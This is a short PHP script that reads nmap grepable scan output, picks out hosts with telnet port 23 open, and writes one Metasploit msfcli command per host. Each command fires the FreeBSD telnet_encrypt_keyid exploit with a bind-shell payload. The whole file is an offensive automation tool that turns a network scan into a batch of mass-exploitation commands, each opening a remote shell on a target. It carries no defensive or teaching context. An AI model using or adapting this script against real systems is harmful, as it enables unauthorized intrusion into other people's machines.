<?php
// By: sk

$args       = getopt("f:o:");
$fileName   = $args['f'];
$outputFile = $args['o'];

printf("[+] Parsing: %s\n", $fileName);
if (!file_exists($fileName)) {
   printf("[-] Cannot find file!\n");
   exit();
}

$fileContents = trim(file_get_contents($fileName));
$fileSet = explode("\n", $fileContents);

unset($fileSet[0]);
unset($fileSet[sizeof($fileSet)]);

$cmdStack = array();

foreach($fileSet as $hostSet) {
    $entry = explode(" ", $hostSet);

    if ($entry[3] == '23/open/tcp//telnet///') {
        $cmdStack[] = sprintf(
		    "/opt/metasploit3/bin/msfcli exploit/freebsd/telnet/telnet_encrypt_keyid RHOST=%s PAYLOAD=bsd/x86/shell/bind_tcp E\n",
		    $entry[1]);
    }
}

if (!empty($cmdStack))
{
    foreach($cmdStack as $cmd) {
        file_put_contents($outputFile, $cmd, FILE_APPEND);
    }

    printf("[+] %s hosts written to file!\n", count($cmdStack));
}
else
{
    printf("[-] No hosts written to file\n");
}
